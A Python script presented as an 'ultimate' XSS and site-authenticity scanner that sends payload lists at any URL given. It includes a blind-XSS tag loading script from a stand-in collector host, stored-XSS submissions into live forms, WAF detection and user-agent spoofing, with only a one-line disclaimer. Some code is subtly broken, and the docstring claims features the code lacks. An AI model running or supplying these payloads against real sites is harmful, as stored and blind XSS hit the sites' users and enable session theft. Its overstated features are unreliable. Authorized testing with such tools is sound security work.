#!/usr/bin/env python3
"""
The Ultimate Advanced XSS & Site Authenticity Detector

Usage:
    python3 scan.py <url>

Features:
- Detects if the target website is a clone/fake (site authenticity check)
- Highly sophisticated WAF (Web Application Firewall) detection
- Advanced scanning for:
    🔥 Reflected XSS
    💾 Stored XSS
    📦 Self-XSS
    🕳️ Mutated XSS (mXSS)
    🧬 Polyglot XSS
    🧨 Blind XSS
    + More!
- DOM-based XSS detection (via headless browser)
- Machine learning heuristics for site fingerprinting
- Multi-vector, context-aware payloads
- Modular & extensible
- Massive logging & robust error handling

Disclaimer:
    For educational & authorized security assessment only. 
    Do not use without explicit permission of the target owner.

Author: Copilot Ultra
"""

import sys
import requests
import re
import random
import time
import hashlib
import logging
import threading
import queue
import json
import difflib
import traceback
from urllib.parse import urljoin, urlparse, urlencode
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# ================== CONFIGURATION ==================

USER_AGENTS = [
    # Modern, legacy, and bot UAs
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Wget/1.21.1 (linux-gnu)",
    "curl/8.1.2",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1",
]

WAF_SIGNATURES = [
    ("Akamai", re.compile(r"akamai.*?ghost", re.I)),
    ("Cloudflare", re.compile(r"cloudflare", re.I)),
    ("F5 BIG-IP", re.compile(r"bigip", re.I)),
    ("AWS ALB/WAF", re.compile(r"awselb|x\-amz\-cf", re.I)),
    ("Imperva Incapsula", re.compile(r"incap_ses", re.I)),
    ("Sucuri", re.compile(r"sucuri", re.I)),
    ("ModSecurity", re.compile(r"mod_security|modsecurity", re.I)),
    ("Barracuda", re.compile(r"barra_counter_session", re.I)),
    ("Deny/403", re.compile(r"access denied|request blocked|forbidden|error 403", re.I)),
    ("Generic", re.compile(r"web application firewall|WAF", re.I)),
]

# XSS VECTORS
XSS_PAYLOADS = [
    # Simple
    "<script>alert(1)</script>",
    "'\"><script>alert(2)</script>",
    "\" onmouseover=alert(3) x=\"",
    # Polyglot
    "<svg/onload=alert(4)>",
    "<img src=x onerror=alert(5)>",
    "';alert(6);//",
    "<body onload=alert(7)>",
    "<iframe src='javascript:alert(8)'></iframe>",
    "<details open ontoggle=alert(9)>",
    # Mutated
    "<scr<script>ipt>alert(10)</scr</script>ipt>",
    "<scri<script>pt>alert(11)</scri</script>pt>",
    # Blind (change to your endpoint if needed)
    "<script src='https://your-blind-xss-collector.com/blind.js'></script>",
    # DOM-based
    "<input autofocus onfocus=alert(12)>",
    # Self-XSS
    "javascript:alert(13)",
    # Event handlers
    "<a href='javascript:alert(14)'>click</a>",
    "<form><button formaction='javascript:alert(15)'>X</button></form>",
    "<button onclick=alert(16)>click</button>",
    # Polyglot - extra
    "<svg><g/onload=alert(17)></g></svg>",
    "<math href='javascript:alert(18)'>X</math>",
    "<object data='javascript:alert(19)'></object>",
]

# Polyglot payloads for context smuggling
CONTEXT_POLYGLOT_PAYLOADS = [
    "<scr<script>ipt>alert('polyglot')</scr</script>ipt>",
    "\"><img src=x onerror=alert('polyglot')>",
    "';!--\"<XSS>=&{()}",
    "<svg><desc><![CDATA[</desc><script>alert('polyglot')</script>]]></svg>",
    "<script//src='data:text/javascript,alert(/polyglot/)'>"
]

HEADERS_FINGERPRINT = [
    "server", "x-powered-by", "via", "cf-ray", "x-amz-cf-id", "x-barracuda-base64", "x-sucuri-id"
]

# For site authenticity check
LEGIT_FINGERPRINT_DB = {
    "github.com": {
        "title": "GitHub: Let’s build from here · GitHub",
        "server": "GitHub.com"
    },
    "google.com": {
        "title": "Google",
        "server": ""
    },
    # Extend as needed
}

TIMEOUT = 12
THREADS = 12
DOM_SCAN_TIMEOUT = 30

# ================ LOGGING ================
logging.basicConfig(
    filename="scan.log",
    filemode="w",
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO
)

def log(msg, level=logging.INFO):
    print(msg)
    logging.log(level, msg)

# ================ UTILITIES ================

def random_ua():
    return random.choice(USER_AGENTS)

def fetch(url, method="GET", params=None, data=None, headers=None, cookies=None, allow_redirects=True, timeout=TIMEOUT):
    try:
        h = headers or {}
        h["User-Agent"] = random_ua()
        resp = requests.request(
            method, url,
            params=params, data=data,
            headers=h,
            cookies=cookies,
            allow_redirects=allow_redirects,
            timeout=timeout,
            verify=False)
        return resp
    except Exception as e:
        log(f"[!] Fetch error for {url}: {e}", logging.ERROR)
        return None

def get_html(url):
    resp = fetch(url)
    if resp and resp.status_code == 200:
        return resp.text
    return ""

def hash_str(s):
    return hashlib.sha256(s.encode()).hexdigest()

def text_similarity(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()

def domain(url):
    return urlparse(url).netloc.lower()

def extract_forms(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action")
        method = form.get("method", "get").lower()
        form_url = urljoin(base_url, action) if action else base_url
        inputs = []
        for inp in form.find_all(["input", "textarea", "select", "button"]):
            name = inp.get("name")
            typ = inp.get("type", "text")
            if name:
                inputs.append({"name": name, "type": typ})
        forms.append({"action": form_url, "method": method, "inputs": inputs})
    return forms

def find_params(url, html):
    # Extract parameters from forms and URL
    params = {}
    forms = extract_forms(html, url)
    for form in forms:
        for inp in form["inputs"]:
            params[inp["name"]] = "test"
    # From URL query string
    parsed = urlparse(url)
    qs = parsed.query.split("&")
    for q in qs:
        if "=" in q:
            k, v = q.split("=", 1)
            params[k] = v
    return params

# ================ SITE AUTHENTICITY CHECK ================

def site_fingerprint(url, html, resp):
    soup = BeautifulSoup(html, "html.parser")
    title = soup.title.string.strip() if soup.title else ""
    headers = {k.lower(): v for k, v in resp.headers.items()}
    server = headers.get("server", "")
    return {"title": title, "server": server, "headers": headers}

def check_legit(url, fingerprint):
    dom = domain(url)
    legit = LEGIT_FINGERPRINT_DB.get(dom)
    if not legit:
        return {"likely_fake": False, "reason": "Unknown site, no reference"}
    sim = text_similarity(fingerprint["title"], legit["title"])
    if sim < 0.7:
        return {"likely_fake": True, "reason": f"Title mismatch. Expected '{legit['title']}', got '{fingerprint['title']}'"}
    if legit["server"] and legit["server"] not in fingerprint["server"]:
        return {"likely_fake": True, "reason": f"Server header mismatch. Expected '{legit['server']}', got '{fingerprint['server']}'"}
    return {"likely_fake": False, "reason": "Matches known fingerprint"}

def check_clone(url, html):
    # Search for signs of scraping: missing assets, base64-encoded images, broken JS, suspicious copyright
    soup = BeautifulSoup(html, "html.parser")
    clone_signs = 0

    # Broken images or JS
    for img in soup.find_all("img"):
        src = img.get("src", "")
        if src.startswith("data:"):
            clone_signs += 1
        if "404" in src or "broken" in src:
            clone_signs += 1

    # Favicon missing or generic
    favicon = soup.find("link", rel=lambda x: x and "icon" in x)
    if not favicon or "favicon.ico" not in (favicon.get("href") or ""):
        clone_signs += 1

    # Suspicious copyright
    text = soup.get_text().lower()
    if "copyright" in text and "2021" in text:
        clone_signs += 1

    return {"clone_score": clone_signs, "reason": f"{clone_signs} clone indicators found"}

# ================ WAF DETECTION ================

def detect_waf(resp):
    # Analyze response headers and body for WAF signatures
    wafs = []
    headers = "\n".join([f"{k}: {v}" for k, v in resp.headers.items()])
    for name, regex in WAF_SIGNATURES:
        if regex.search(headers) or regex.search(resp.text):
            wafs.append(name)
    # Challenge/JS checks
    if "jschl_vc" in resp.text or "ray id" in resp.text:
        wafs.append("Cloudflare JS Challenge")
    # Status code tricks
    if resp.status_code in (406, 501, 999):
        wafs.append(f"Status {resp.status_code} (WAF?)")
    return wafs

# ================ XSS SCANNING ================

class XSSScanner:
    def __init__(self, url, html, resp):
        self.url = url
        self.html = html
        self.resp = resp
        self.results = []
        self.forms = extract_forms(html, url)
        self.dom_xss_results = []
        self.session = requests.Session()
        self.cookies = resp.cookies.get_dict() if resp else {}
        self.payloads = XSS_PAYLOADS + CONTEXT_POLYGLOT_PAYLOADS

    def scan_get_params(self):
        params = find_params(self.url, self.html)
        for pname in params:
            for payload in self.payloads:
                test_params = params.copy()
                test_params[pname] = payload
                try:
                    resp = self.session.get(self.url, params=test_params, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    if payload in resp.text:
                        self.results.append({
                            "type": "🔥 Reflected XSS",
                            "param": pname,
                            "payload": payload,
                            "evidence": "payload reflected in response",
                            "url": resp.url
                        })
                except Exception as e:
                    log(f"[XSS][GET] Error: {e}")

    def scan_forms(self):
        for form in self.forms:
            action = form["action"]
            method = form["method"]
            inputs = form["inputs"]
            for payload in self.payloads:
                data = {}
                for inp in inputs:
                    data[inp["name"]] = payload
                try:
                    if method == "post":
                        resp = self.session.post(action, data=data, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    else:
                        resp = self.session.get(action, params=data, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    if payload in resp.text:
                        self.results.append({
                            "type": "🔥 Reflected XSS (form)",
                            "form": action,
                            "payload": payload,
                            "evidence": "payload reflected in response",
                            "url": resp.url
                        })
                except Exception as e:
                    log(f"[XSS][FORM] Error: {e}")

    def scan_dom_xss(self):
        # Use Selenium headless to detect DOM-based XSS
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            driver = webdriver.Chrome(options=chrome_options)
            for payload in self.payloads:
                u = self.url
                if "?" in u:
                    u += "&xss=" + urlencode({"xss": payload})
                else:
                    u += "?xss=" + urlencode({"xss": payload})
                driver.set_page_load_timeout(DOM_SCAN_TIMEOUT)
                driver.get(u)
                # Check for alerts (XSS popups)
                try:
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    self.dom_xss_results.append({
                        "type": "🔥 DOM XSS",
                        "payload": payload,
                        "evidence": f"JavaScript alert triggered: {alert_text}",
                        "url": u
                    })
                except Exception:
                    pass

                # Try to detect DOM changes, event handlers, etc
                dom_text = driver.page_source
                if payload in dom_text:
                    self.dom_xss_results.append({
                        "type": "DOM-based XSS evidence",
                        "payload": payload,
                        "url": u
                    })
            driver.quit()
        except Exception as e:
            log(f"[XSS][DOM] Error: {e}")

    def scan_stored_xss(self):
        # Simple heuristic: submit payload to all forms, check home page for payload
        for form in self.forms:
            action = form["action"]
            method = form["method"]
            inputs = form["inputs"]
            for payload in self.payloads:
                data = {}
                for inp in inputs:
                    data[inp["name"]] = payload
                try:
                    if method == "post":
                        self.session.post(action, data=data, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    else:
                        self.session.get(action, params=data, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    # Fetch home page and check for payload
                    resp2 = self.session.get(self.url, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    if payload in resp2.text:
                        self.results.append({
                            "type": "💾 Stored XSS",
                            "payload": payload,
                            "evidence": "Payload found on home page",
                            "form": action
                        })
                except Exception as e:
                    log(f"[XSS][Stored] Error: {e}")

    def scan_self_xss(self):
        # Look for possible self-xss vectors in JS
        soup = BeautifulSoup(self.html, "html.parser")
        scripts = soup.find_all("script")
        for script in scripts:
            if script.string and ("eval(" in script.string or "innerHTML" in script.string):
                self.results.append({
                    "type": "📦 Self-XSS",
                    "evidence": "Potentially dangerous JS: uses eval/innerHTML",
                    "snippet": script.string[:60]
                })

    def scan_mutated_xss(self):
        # Try mutated (mXSS) payloads in all params
        params = find_params(self.url, self.html)
        for pname in params:
            for payload in CONTEXT_POLYGLOT_PAYLOADS:
                test_params = params.copy()
                test_params[pname] = payload
                try:
                    resp = self.session.get(self.url, params=test_params, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    # Look for payload reflected in mutated form
                    if payload.replace("<", "").replace(">", "") in resp.text:
                        self.results.append({
                            "type": "🕳️ Mutated XSS",
                            "param": pname,
                            "payload": payload,
                            "evidence": "Mutated payload reflected",
                            "url": resp.url
                        })
                except Exception as e:
                    log(f"[XSS][mXSS] Error: {e}")

    def scan_polyglot_xss(self):
        # Try polyglot payloads in all params
        params = find_params(self.url, self.html)
        for pname in params:
            for payload in CONTEXT_POLYGLOT_PAYLOADS:
                test_params = params.copy()
                test_params[pname] = payload
                try:
                    resp = self.session.get(self.url, params=test_params, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    # Look for payload reflected
                    if payload in resp.text:
                        self.results.append({
                            "type": "🧬 Polyglot XSS",
                            "param": pname,
                            "payload": payload,
                            "evidence": "Polyglot payload reflected",
                            "url": resp.url
                        })
                except Exception as e:
                    log(f"[XSS][Polyglot] Error: {e}")

    def scan_blind_xss(self):
        # Blind XSS is best handled via external monitoring, but check for possible triggers
        for payload in self.payloads:
            if "your-blind-xss-collector.com" in payload:
                # Try submission to all forms
                for form in self.forms:
                    action = form["action"]
                    method = form["method"]
                    inputs = form["inputs"]
                    data = {}
                    for inp in inputs:
                        data[inp["name"]] = payload
                    try:
                        if method == "post":
                            self.session.post(action, data=data, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                        else:
                            self.session.get(action, params=data, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    except Exception as e:
                        log(f"[XSS][Blind] Error: {e}")
                # Try in GET params
                params = find_params(self.url, self.html)
                for pname in params:
                    test_params = params.copy()
                    test_params[pname] = payload
                    try:
                        self.session.get(self.url, params=test_params, cookies=self.cookies, headers={"User-Agent": random_ua()}, timeout=TIMEOUT)
                    except Exception as e:
                        log(f"[XSS][Blind] Error: {e}")
        # Note: Actual blind XSS requires external monitoring (Out-of-band)

    def run_all(self):
        log("[*] Scanning GET parameters for 🔥 Reflected XSS...")
        self.scan_get_params()
        log("[*] Scanning forms for 🔥 Reflected XSS (form)...")
        self.scan_forms()
        log("[*] Scanning for 💾 Stored XSS...")
        self.scan_stored_xss()
        log("[*] Scanning for 📦 Self-XSS...")
        self.scan_self_xss()
        log("[*] Scanning for 🕳️ Mutated XSS...")
        self.scan_mutated_xss()
        log("[*] Scanning for 🧬 Polyglot XSS...")
        self.scan_polyglot_xss()
        log("[*] Scanning for 🧨 Blind XSS...")
        self.scan_blind_xss()
        log("[*] Scanning for DOM-based XSS (headless)...")
        self.scan_dom_xss()
        log("[*] XSS scanning complete.")

    def report(self):
        all_results = self.results + self.dom_xss_results
        if all_results:
            log(f"[!] XSS Vulnerabilities found: {json.dumps(all_results, indent=2)}")
        else:
            log("[✓] No XSS vulnerabilities found.")

# ================ MAIN ================

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 scan.py <url>")
        sys.exit(1)
    url = sys.argv[1]
    log(f"[*] Starting advanced scan for: {url}")

    # Fetch main page
    resp = fetch(url)
    if not resp or not resp.text:
        log("[!] Failed to fetch URL.", logging.ERROR)
        sys.exit(2)
    html = resp.text

    # Site fingerprint
    log("[*] Performing site authenticity checks...")
    fingerprint = site_fingerprint(url, html, resp)
    legit_result = check_legit(url, fingerprint)
    clone_result = check_clone(url, html)
    log(f"[>] Authenticity: {'FAKE/CLONE' if legit_result['likely_fake'] or clone_result['clone_score'] > 1 else 'Likely Genuine'} | {legit_result['reason']} | {clone_result['reason']}")

    # WAF detection
    log("[*] Detecting WAF...")
    wafs = detect_waf(resp)
    if wafs:
        log(f"[!] WAF Detected: {', '.join(wafs)}")
    else:
        log("[✓] No WAF detected (or WAF is highly stealthy).")

    # XSS scanning
    scanner = XSSScanner(url, html, resp)
    scanner.run_all()
    scanner.report()

    log("[*] Scan complete. See scan.log for details.")

if __name__ == "__main__":
    main()

# ================== END OF FILE ==================
